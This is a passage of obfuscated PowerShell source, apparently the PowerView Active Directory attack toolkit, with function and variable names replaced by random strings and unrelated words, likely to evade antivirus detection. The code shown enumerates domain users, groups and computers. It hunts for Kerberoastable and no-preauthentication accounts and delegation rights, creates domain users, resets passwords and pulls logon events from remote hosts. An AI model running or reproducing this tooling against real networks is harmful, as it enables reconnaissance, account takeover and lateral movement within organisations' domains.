        [Int]
        $elDiVqTz99,
        [Switch]
        $rmzHuzlC99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $UoWrSAug99 = @('admincount','accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','description', 'displayname','distinguishedname','dscorepropagationdata','givenname','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','lockouttime','logoncount','memberof','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','primarygroupid','pwdlastset','samaccountname','samaccounttype','sn','useraccountcontrol','userprincipalname','usnchanged','usncreated','whenchanged','whencreated')
        $QWLsQVSR99 = @('admincount','cn','description','distinguishedname','dscorepropagationdata','grouptype','instancetype','iscriticalsystemobject','member','memberof','name','objectcategory','objectclass','objectguid','objectsid','samaccountname','samaccounttype','systemflags','usnchanged','usncreated','whenchanged','whencreated')
        $nzueOgbA99 = @('accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','distinguishedname','dnshostname','dscorepropagationdata','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','localpolicyflags','logoncount','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','operatingsystem','operatingsystemservicepack','operatingsystemversion','primarygroupid','pwdlastset','samaccountname','samaccounttype','serviceprincipalname','useraccountcontrol','usnchanged','usncreated','whenchanged','whencreated')
        $XVFWmInN99 = @{}
        if ($PSBoundParameters['Domain']) { $XVFWmInN99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['LDAPFilter']) { $XVFWmInN99['LDAPFilter'] = $SeHRgLsL99 }
        if ($PSBoundParameters['SearchBase']) { $XVFWmInN99['SearchBase'] = $WdOnSHnL99 }
        if ($PSBoundParameters['Server']) { $XVFWmInN99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $XVFWmInN99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $XVFWmInN99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $XVFWmInN99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['Tombstone']) { $XVFWmInN99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $XVFWmInN99['Credential'] = $fjBNCklg99 }
        if ($PSBoundParameters['Domain']) {
            if ($PSBoundParameters['Credential']) {
                $ywkQcSte99 = indicate -jnYnRnFJ99 $jnYnRnFJ99 | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            else {
                $ywkQcSte99 = indicate -jnYnRnFJ99 $jnYnRnFJ99 -fjBNCklg99 $fjBNCklg99 | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            Write-Verbose "[lynched] Enumerated forest '$ywkQcSte99' for target domain '$jnYnRnFJ99'"
        }
        $GJHulDDs99 = @{}
        if ($PSBoundParameters['Credential']) { $GJHulDDs99['Credential'] = $fjBNCklg99 }
        if ($ywkQcSte99) {
            $GJHulDDs99['Forest'] = $ywkQcSte99
        }
    }
    PROCESS {
        if ($PSBoundParameters['ReferencePropertySet']) {
            Write-Verbose "[lynched] Using specified -bLaohisl99"
            $OqYyIKsw99 = $bLaohisl99
        }
        elseif ($PSBoundParameters['ReferenceObject']) {
            Write-Verbose "[lynched] Extracting property names from -bbVuSzqh99 to use as the reference property set"
            $OqYyIKsw99 = Get-Member -axISfSto99 $bbVuSzqh99 -MemberType NoteProperty | Select-Object -Expand Name
            $iAAmWwUv99 = $bbVuSzqh99.objectclass | Select-Object -Last 1
            Write-Verbose "[lynched] Calculated ReferenceObjectClass : $iAAmWwUv99"
        }
        else {
            Write-Verbose "[lynched] Using the default reference property set for the object class '$zSHOhJNE99'"
        }
        if (($zSHOhJNE99 -eq 'User') -or ($iAAmWwUv99 -eq 'User')) {
            $oIIOIBMn99 = suit @SearcherArguments
            if (-not $OqYyIKsw99) {
                $OqYyIKsw99 = $UoWrSAug99
            }
        }
        elseif (($zSHOhJNE99 -eq 'Group') -or ($iAAmWwUv99 -eq 'Group')) {
            $oIIOIBMn99 = con @SearcherArguments
            if (-not $OqYyIKsw99) {
                $OqYyIKsw99 = $QWLsQVSR99
            }
        }
        elseif (($zSHOhJNE99 -eq 'Computer') -or ($iAAmWwUv99 -eq 'Computer')) {
            $oIIOIBMn99 = cowing @SearcherArguments
            if (-not $OqYyIKsw99) {
                $OqYyIKsw99 = $nzueOgbA99
            }
        }
        else {
            throw "[lynched] Invalid class: $zSHOhJNE99"
        }
        ForEach ($Object in $oIIOIBMn99) {
            $hjTjfzZi99 = Get-Member -axISfSto99 $Object -MemberType NoteProperty | Select-Object -Expand Name
            ForEach($wAyfgQMl99 in $hjTjfzZi99) {
                if ($OqYyIKsw99 -NotContains $wAyfgQMl99) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'SamAccountName' $Object.SamAccountName
                    $Out | Add-Member Noteproperty 'Property' $wAyfgQMl99
                    $Out | Add-Member Noteproperty 'Value' $Object.$wAyfgQMl99
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.PropertyOutlier')
                    $Out
                }
            }
        }
    }
}
function suit {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $feaYcbZI99,
        [Switch]
        $SPN,
        [Switch]
        $svHNHCqS99,
        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $XYvyppHo99,
        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $GjjkzXqu99,
        [Switch]
        $HfAxnUBs99,
        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $cpZhmtQW99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $SeHRgLsL99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ycQOyvWh99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $WdOnSHnL99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $azVlDiTB99,
        [Switch]
        $rmzHuzlC99,
        [Alias('ReturnOne')]
        [Switch]
        $cIwTZAKh99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        $fokrrvjQ99 = [Enum]::GetNames($XhWoAzaE99)
        $fokrrvjQ99 = $fokrrvjQ99 | ForEach-Object {$_; "NOT_$_"}
        preventive -Name UACFilter -tBIdqNFz99 $fokrrvjQ99 -Type ([array])
    }
    BEGIN {
        $XVFWmInN99 = @{}
        if ($PSBoundParameters['Domain']) { $XVFWmInN99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['Properties']) { $XVFWmInN99['Properties'] = $ycQOyvWh99 }
        if ($PSBoundParameters['SearchBase']) { $XVFWmInN99['SearchBase'] = $WdOnSHnL99 }
        if ($PSBoundParameters['Server']) { $XVFWmInN99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $XVFWmInN99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $XVFWmInN99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $XVFWmInN99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['SecurityMasks']) { $XVFWmInN99['SecurityMasks'] = $azVlDiTB99 }
        if ($PSBoundParameters['Tombstone']) { $XVFWmInN99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $XVFWmInN99['Credential'] = $fjBNCklg99 }
        $RAYXFvvv99 = maroons @SearcherArguments
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            preventive -mBmtwKgS99 -URtDicpQ99 $PSBoundParameters
        }
        if ($RAYXFvvv99) {
            $igkjuUBu99 = ''
            $pIJjStMG99 = ''
            $feaYcbZI99 | Where-Object {$_} | ForEach-Object {
                $vNrdYYXO99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($vNrdYYXO99 -match '^S-1-') {
                    $igkjuUBu99 += "(objectsid=$vNrdYYXO99)"
                }
                elseif ($vNrdYYXO99 -match '^CN=') {
                    $igkjuUBu99 += "(distinguishedname=$vNrdYYXO99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $CtdjjEVe99 = $vNrdYYXO99.SubString($vNrdYYXO99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[suit] Extracted domain '$CtdjjEVe99' from '$vNrdYYXO99'"
                        $XVFWmInN99['Domain'] = $CtdjjEVe99
                        $RAYXFvvv99 = maroons @SearcherArguments
                        if (-not $RAYXFvvv99) {
                            Write-Warning "[suit] Unable to retrieve domain searcher for '$CtdjjEVe99'"
                        }
                    }
                }
                elseif ($vNrdYYXO99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $VAqEOfOY99 = (([Guid]$vNrdYYXO99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $igkjuUBu99 += "(objectguid=$VAqEOfOY99)"
                }
                elseif ($vNrdYYXO99.Contains('\')) {
                    $amRsUbps99 = $vNrdYYXO99.Replace('\28', '(').Replace('\29', ')') | offings -EsfqZxkA99 Canonical
                    if ($amRsUbps99) {
                        $CQMlcaaA99 = $amRsUbps99.SubString(0, $amRsUbps99.IndexOf('/'))
                        $PYHFAZKa99 = $vNrdYYXO99.Split('\')[1]
                        $igkjuUBu99 += "(samAccountName=$PYHFAZKa99)"
                        $XVFWmInN99['Domain'] = $CQMlcaaA99
                        Write-Verbose "[suit] Extracted domain '$CQMlcaaA99' from '$vNrdYYXO99'"
                        $RAYXFvvv99 = maroons @SearcherArguments
                    }
                }
                else {
                    $igkjuUBu99 += "(samAccountName=$vNrdYYXO99)"
                }
            }
            if ($igkjuUBu99 -and ($igkjuUBu99.Trim() -ne '') ) {
                $pIJjStMG99 += "(|$igkjuUBu99)"
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose '[suit] Searching for non-null service principal names'
                $pIJjStMG99 += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                Write-Verbose '[suit] Searching for users who can be delegated'
                $pIJjStMG99 += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                Write-Verbose '[suit] Searching for users who are sensitive and not trusted for delegation'
                $pIJjStMG99 += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose '[suit] Searching for adminCount=1'
                $pIJjStMG99 += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[suit] Searching for users that are trusted to authenticate for other principals'
                $pIJjStMG99 += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                Write-Verbose '[suit] Searching for user accounts that do not require kerberos preauthenticate'
                $pIJjStMG99 += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[suit] Using additional LDAP filter: $SeHRgLsL99"
                $pIJjStMG99 += "$SeHRgLsL99"
            }
            $HHRLoZva99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $OeZYtPdt99 = $_.Substring(4)
                    $KTofVmua99 = [Int]($XhWoAzaE99::$OeZYtPdt99)
                    $pIJjStMG99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$KTofVmua99))"
                }
                else {
                    $KTofVmua99 = [Int]($XhWoAzaE99::$_)
                    $pIJjStMG99 += "(userAccountControl:1.2.840.113556.1.4.803:=$KTofVmua99)"
                }
            }
            $RAYXFvvv99.filter = "(&(samAccountType=805306368)$pIJjStMG99)"
            Write-Verbose "[suit] filter string: $($RAYXFvvv99.filter)"
            if ($PSBoundParameters['FindOne']) { $CmGXBhUd99 = $RAYXFvvv99.FindOne() }
            else { $CmGXBhUd99 = $RAYXFvvv99.FindAll() }
            $CmGXBhUd99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $User = $_
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    $User = foregather -ycQOyvWh99 $_.Properties
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User')
                }
                $User
            }
            if ($CmGXBhUd99) {
                try { $CmGXBhUd99.dispose() }
                catch {
                    Write-Verbose "[suit] Error disposing of the Results object: $_"
                }
            }
            $RAYXFvvv99.dispose()
        }
    }
}
function bludgeoned {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $jFhxwutu99,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $XvdoLWeK99,
        [ValidateNotNullOrEmpty()]
        [String]
        $Name,
        [ValidateNotNullOrEmpty()]
        [String]
        $GylpOMIi99,
        [ValidateNotNullOrEmpty()]
        [String]
        $AGwIAYxa99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    $VmQxvGKA99 = @{
        'Identity' = $jFhxwutu99
    }
    if ($PSBoundParameters['Domain']) { $VmQxvGKA99['Domain'] = $jnYnRnFJ99 }
    if ($PSBoundParameters['Credential']) { $VmQxvGKA99['Credential'] = $fjBNCklg99 }
    $EOHvLUHq99 = Timur @ContextArguments
    if ($EOHvLUHq99) {
        $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($EOHvLUHq99.Context)
        $User.SamAccountName = $EOHvLUHq99.Identity
        $OZHPbFRW99 = New-Object System.Management.Automation.PSCredential('a', $XvdoLWeK99)
        $User.SetPassword($OZHPbFRW99.GetNetworkCredential().Password)
        $User.Enabled = $True
        $User.PasswordNotRequired = $False
        if ($PSBoundParameters['Name']) {
            $User.Name = $Name
        }
        else {
            $User.Name = $EOHvLUHq99.Identity
        }
        if ($PSBoundParameters['DisplayName']) {
            $User.DisplayName = $GylpOMIi99
        }
        else {
            $User.DisplayName = $EOHvLUHq99.Identity
        }
        if ($PSBoundParameters['Description']) {
            $User.Description = $AGwIAYxa99
        }
        Write-Verbose "[bludgeoned] Attempting to create user '$jFhxwutu99'"
        try {
            $Null = $User.Save()
            Write-Verbose "[bludgeoned] User '$jFhxwutu99' successfully created"
            $User
        }
        catch {
            Write-Warning "[bludgeoned] Error creating user '$jFhxwutu99' : $_"
        }
    }
}
function agile {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('UserName', 'UserIdentity', 'User')]
        [String]
        $feaYcbZI99,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $XvdoLWeK99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    $VmQxvGKA99 = @{ 'Identity' = $feaYcbZI99 }
    if ($PSBoundParameters['Domain']) { $VmQxvGKA99['Domain'] = $jnYnRnFJ99 }
    if ($PSBoundParameters['Credential']) { $VmQxvGKA99['Credential'] = $fjBNCklg99 }
    $EOHvLUHq99 = Timur @ContextArguments
    if ($EOHvLUHq99) {
        $User = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity($EOHvLUHq99.Context, $feaYcbZI99)
        if ($User) {
            Write-Verbose "[agile] Attempting to set the password for user '$feaYcbZI99'"
            try {
                $OZHPbFRW99 = New-Object System.Management.Automation.PSCredential('a', $XvdoLWeK99)
                $User.SetPassword($OZHPbFRW99.GetNetworkCredential().Password)
                $Null = $User.Save()
                Write-Verbose "[agile] Password for user '$feaYcbZI99' successfully reset"
            }
            catch {
                Write-Warning "[agile] Error setting password for user '$feaYcbZI99' : $_"
            }
        }
        else {
            Write-Warning "[agile] Unable to find user '$feaYcbZI99'"
        }
    }
}
function gestates {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogonEvent')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cSHFXHUa99 = $Env:COMPUTERNAME,
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $HCZCxfVt99 = [DateTime]::Now.AddDays(-1),
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $CkBHjpIp99 = [DateTime]::Now,
        [ValidateRange(1, 1000000)]
        [Int]
        $QNsvKvrK99 = 5000,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $lwONpiCH99 = @"
<QueryList>
    <Query Id="0" Path="Security">
        <!-- Logon events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4624)
                    and TimeCreated[
                        @SystemTime&gt;='$($HCZCxfVt99.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($CkBHjpIp99.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
            and
            *[EventData[Data[@Name='TargetUserName'] != 'ANONYMOUS LOGON']]
        </Select>
        <!-- Logon with explicit credential events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4648)
                    and TimeCreated[
                        @SystemTime&gt;='$($HCZCxfVt99.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($CkBHjpIp99.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
        </Select>
        <Suppress Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and
                    (Level=4 or Level=0) and (EventID=4624 or EventID=4625 or EventID=4634)
                ]
            ]
            and
            *[
                EventData[
                    (
                        (Data[@Name='LogonType']='5' or Data[@Name='LogonType']='0')
                        or
                        Data[@Name='TargetUserName']='ANONYMOUS LOGON'
                        or
                        Data[@Name='TargetUserSID']='S-1-5-18'
                    )
                ]
            ]
        </Suppress>
    </Query>
</QueryList>
"@
        $oNUxNrKT99 = @{
            'FilterXPath' = $lwONpiCH99
            'LogName' = 'Security'
            'MaxEvents' = $QNsvKvrK99
        }
        if ($PSBoundParameters['Credential']) { $oNUxNrKT99['Credential'] = $fjBNCklg99 }
    }
    PROCESS {
        ForEach ($GocAGaEB99 in $cSHFXHUa99) {
            $oNUxNrKT99['ComputerName'] = $GocAGaEB99
            Get-WinEvent @EventArguments| ForEach-Object {
                $Event = $_
                $ycQOyvWh99 = $Event.Properties
                Switch ($Event.Id) {
                    4624 {
                        if(-not $ycQOyvWh99[5].Value.EndsWith('$')) {
                            $YrLtLWOk99 = New-Object PSObject -Property @{
                                ComputerName              = $GocAGaEB99
                                TimeCreated               = $Event.TimeCreated
                                EventId                   = $Event.Id
                                SubjectUserSid            = $ycQOyvWh99[0].Value.ToString()
                                SubjectUserName           = $ycQOyvWh99[1].Value
                                SubjectDomainName         = $ycQOyvWh99[2].Value
                                SubjectLogonId            = $ycQOyvWh99[3].Value
                                TargetUserSid             = $ycQOyvWh99[4].Value.ToString()
                                TargetUserName            = $ycQOyvWh99[5].Value
                                TargetDomainName          = $ycQOyvWh99[6].Value
                                TargetLogonId             = $ycQOyvWh99[7].Value
                                LogonType                 = $ycQOyvWh99[8].Value
                                LogonProcessName          = $ycQOyvWh99[9].Value
                                AuthenticationPackageName = $ycQOyvWh99[10].Value
                                WorkstationName           = $ycQOyvWh99[11].Value
                                LogonGuid                 = $ycQOyvWh99[12].Value
                                TransmittedServices       = $ycQOyvWh99[13].Value
                                LmPackageName             = $ycQOyvWh99[14].Value
                                KeyLength                 = $ycQOyvWh99[15].Value
                                ProcessId                 = $ycQOyvWh99[16].Value
                                ProcessName               = $ycQOyvWh99[17].Value
                                IpAddress                 = $ycQOyvWh99[18].Value
                                IpPort                    = $ycQOyvWh99[19].Value
                                ImpersonationLevel        = $ycQOyvWh99[20].Value
                                RestrictedAdminMode       = $ycQOyvWh99[21].Value
                                TargetOutboundUserName    = $ycQOyvWh99[22].Value
                                TargetOutboundDomainName  = $ycQOyvWh99[23].Value
                                VirtualAccount            = $ycQOyvWh99[24].Value
                                TargetLinkedLogonId       = $ycQOyvWh99[25].Value
                                ElevatedToken             = $ycQOyvWh99[26].Value
                            }
                            $YrLtLWOk99.PSObject.TypeNames.Insert(0, 'PowerView.LogonEvent')
                            $YrLtLWOk99
                        }
                    }
                    4648 {
                        if((-not $ycQOyvWh99[5].Value.EndsWith('$')) -and ($ycQOyvWh99[11].Value -match 'taskhost\.exe')) {
                            $YrLtLWOk99 = New-Object PSObject -Property @{
                                ComputerName              = $GocAGaEB99
                                TimeCreated       = $Event.TimeCreated
                                EventId           = $Event.Id
                                SubjectUserSid    = $ycQOyvWh99[0].Value.ToString()
                                SubjectUserName   = $ycQOyvWh99[1].Value
                                SubjectDomainName = $ycQOyvWh99[2].Value
                                SubjectLogonId    = $ycQOyvWh99[3].Value
                                LogonGuid         = $ycQOyvWh99[4].Value.ToString()
                                TargetUserName    = $ycQOyvWh99[5].Value
                                TargetDomainName  = $ycQOyvWh99[6].Value
                                TargetLogonGuid   = $ycQOyvWh99[7].Value
                                TargetServerName  = $ycQOyvWh99[8].Value
                                TargetInfo        = $ycQOyvWh99[9].Value
                                ProcessId         = $ycQOyvWh99[10].Value
                                ProcessName       = $ycQOyvWh99[11].Value
                                IpAddress         = $ycQOyvWh99[12].Value
                                IpPort            = $ycQOyvWh99[13].Value
                            }
                            $YrLtLWOk99.PSObject.TypeNames.Insert(0, 'PowerView.ExplicitCredentialLogonEvent')
                            $YrLtLWOk99
                        }
                    }
                    default {
                        Write-Warning "No handler exists for event ID: $($Event.Id)"
                    }
                }
            }
        }
    }
}
function batted {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    $GUIDs = @{'00000000-0000-0000-0000-000000000000' = 'All'}
    $JEUaTsXa99 = @{}
    if ($PSBoundParameters['Credential']) { $JEUaTsXa99['Credential'] = $fjBNCklg99 }
    try {
        $ljqaQyZw99 = (nullified @ForestArguments).schema.name
    }
    catch {
        throw '[batted] Error in retrieving forest schema path from nullified'
    }
    if (-not $ljqaQyZw99) {
        throw '[batted] Error in retrieving forest schema path from nullified'
    }
    $XVFWmInN99 = @{
        'SearchBase' = $ljqaQyZw99
        'LDAPFilter' = '(schemaIDGUID=*)'
    }
    if ($PSBoundParameters['Domain']) { $XVFWmInN99['Domain'] = $jnYnRnFJ99 }
    if ($PSBoundParameters['Server']) { $XVFWmInN99['Server'] = $qgdPgdMB99 }
    if ($PSBoundParameters['ResultPageSize']) { $XVFWmInN99['ResultPageSize'] = $CgYkCByk99 }
    if ($PSBoundParameters['ServerTimeLimit']) { $XVFWmInN99['ServerTimeLimit'] = $elDiVqTz99 }
    if ($PSBoundParameters['Credential']) { $XVFWmInN99['Credential'] = $fjBNCklg99 }
    $lnHWuATK99 = maroons @SearcherArguments
    if ($lnHWuATK99) {
        try {
            $CmGXBhUd99 = $lnHWuATK99.FindAll()
            $CmGXBhUd99 | Where-Object {$_} | ForEach-Object {
                $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
            if ($CmGXBhUd99) {
                try { $CmGXBhUd99.dispose() }
                catch {
                    Write-Verbose "[batted] Error disposing of the Results object: $_"
                }
            }
            $lnHWuATK99.dispose()
        }
        catch {
            Write-Verbose "[batted] Error in building GUID map: $_"
        }
    }
    $XVFWmInN99['SearchBase'] = $ljqaQyZw99.replace('Schema','Extended-Rights')
    $XVFWmInN99['LDAPFilter'] = '(objectClass=controlAccessRight)'
    $gAIhLQGM99 = maroons @SearcherArguments
    if ($gAIhLQGM99) {
        try {
            $CmGXBhUd99 = $gAIhLQGM99.FindAll()
            $CmGXBhUd99 | Where-Object {$_} | ForEach-Object {
                $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
            if ($CmGXBhUd99) {
                try { $CmGXBhUd99.dispose() }
                catch {
                    Write-Verbose "[batted] Error disposing of the Results object: $_"
                }
            }
            $gAIhLQGM99.dispose()
        }
        catch {
            Write-Verbose "[batted] Error in building GUID map: $_"
        }
    }
    $GUIDs
}
function cowing {
    [OutputType('PowerView.Computer')]
    [OutputType('PowerView.Computer.Raw')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SamAccountName', 'Name', 'DNSHostName')]
        [String[]]
        $feaYcbZI99,
        [Switch]
        $SKpvyXsg99,
        [Switch]
        $HfAxnUBs99,
        [Switch]
        $dGJAZTVN99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePrincipalName')]
        [String]
        $SPN,
        [ValidateNotNullOrEmpty()]
        [String]
        $rqmKHnWu99,
        [ValidateNotNullOrEmpty()]
        [String]
        $gNnwgaEV99,
        [ValidateNotNullOrEmpty()]
        [String]
        $iSntscLt99,
        [Switch]
        $Ping,
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $SeHRgLsL99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ycQOyvWh99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $WdOnSHnL99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $azVlDiTB99,
        [Switch]
        $rmzHuzlC99,
        [Alias('ReturnOne')]
        [Switch]
        $cIwTZAKh99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        $fokrrvjQ99 = [Enum]::GetNames($XhWoAzaE99)
        $fokrrvjQ99 = $fokrrvjQ99 | ForEach-Object {$_; "NOT_$_"}
        preventive -Name UACFilter -tBIdqNFz99 $fokrrvjQ99 -Type ([array])
    }
    BEGIN {
        $XVFWmInN99 = @{}
        if ($PSBoundParameters['Domain']) { $XVFWmInN99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['Properties']) { $XVFWmInN99['Properties'] = $ycQOyvWh99 }
        if ($PSBoundParameters['SearchBase']) { $XVFWmInN99['SearchBase'] = $WdOnSHnL99 }
        if ($PSBoundParameters['Server']) { $XVFWmInN99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $XVFWmInN99['SearchScope'] = $TRVzBsDk99 }
